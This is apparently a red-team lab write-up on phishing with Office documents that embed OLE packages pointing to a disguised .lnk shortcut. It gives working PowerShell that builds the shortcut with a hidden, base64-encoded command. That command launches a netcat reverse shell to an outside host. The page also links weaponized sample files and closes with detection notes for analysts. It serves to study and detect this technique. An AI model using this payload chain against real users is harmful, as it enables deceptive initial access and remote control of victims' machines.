---
description: 'Phishing, Initial Access using embedded OLE + LNK objects'
---

# Phishing: OLE + LNK

This lab explores a popular phishing technique where attackers embed .lnk files into the Office documents and camouflage them with Ms Word office icons in order to deceive victims to click and run them. 

## Weaponization

Creating an .LNK file that will trigger the payload once executed:

{% code title="attacker@local" %}
```csharp
$command = 'Start-Process c:\shell.cmd'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\experiments\ole+lnk\Invoice-FinTech-0900541.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files\Windows NT\Accessories\wordpad.exe"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAOgBcAHMAaABlAGwAbAAuAGMAbQBkAA=="
$link.save()
```
{% endcode %}

Powershell payload will trigger a rudimentary NC reverse shell:

{% code title="c:\\shell.cmd" %}
```csharp
C:\tools\nc.exe 10.0.0.5 443 -e cmd.exe
```
{% endcode %}

Once the above powershell script is executed, an `.LNK` shortcut is created:

![](../../../.gitbook/assets/ole-lnk-shortcut-created.png)

Let's create a Word document that will contain the malicious shortcut that was created in the previous step:

![](../../../.gitbook/assets/ole-good-document.png)

Let's insert a new object into the document by selecting a `Package`and changing its icon source to a Microsoft Word executable:

![](../../../.gitbook/assets/ole-insert-ole-object-with-icon.png)

![](../../../.gitbook/assets/ole-change-icon.png)

Point the package to the .lnk file containing the payload:

![](../../../.gitbook/assets/ole-payload.png)

Final result:

![](../../../.gitbook/assets/ole-weaponized.png)

## Execution

Victim executing the embedded document. Gets presented with a popup to confirm execution:

![](../../../.gitbook/assets/ole-execution.png)

Once the victim confirms they want to open the file - the reverse shell comes back to the attacker:

![](../../../.gitbook/assets/ole-execution2.png)

{% file src="../../../.gitbook/assets/ole.ps1" caption="OLE+LNK Powershell Script" %}

{% file src="../../../.gitbook/assets/invoice-fintech-0900541.lnk" caption="Invoice-FinTech-0900541.lnk" %}

{% file src="../../../.gitbook/assets/completely-not-a-scam-ole+lnk.docx" caption="Phishing: OLE+Lnk MS Word Doc Package" %}

## Observations

After the payload is triggered, the process ancestry looks as expected - powershell gets spawned by winword, cmd is spawned by powershell..:

![](../../../.gitbook/assets/ole-ancestry1.png)

Soon after, the powershell gets killed and cmd.exe becomes an orphaned process:

![](../../../.gitbook/assets/ole-ancestry2.png)

Like in [T1137: Phishing - Office Macros](t1137-office-vba-macros.md), you can use rudimentary tools on your Windows workstation to quickly triage the suspicious Office document. First off, rename the file to a .zip extension and unzip it. Then you can navigate to `word\embeddings` and find `oleObject.bin` file that contains the malicious `.lnk`:

![](../../../.gitbook/assets/ole-embedded-bin.png)

Then you can do a simple `strings` or hexdump against the file and you should immediately see signs of something that should raise your eyebrow\(s\):

```csharp
hexdump.exe -C .\oleObject1.bin
```

![](../../../.gitbook/assets/ole-hexdump.png)

As an analyst, one should look for `CLSID 00021401-0000-0000-c000-000000000046` in the .bin file, which signifies that the .doc contains an embnedded .lnk file. In our case this can be observed here:

![](../../../.gitbook/assets/lnk-clsid.png)

## References

{% embed url="https://msdn.microsoft.com/en-gb/library/dd891343.aspx" %}

{% embed url="https://adsecurity.org/wp-content/uploads/2016/09/DerbyCon6-2016-AttackingEvilCorp-Anatomy-of-a-Corporate-Hack-Presented.pdf" %}

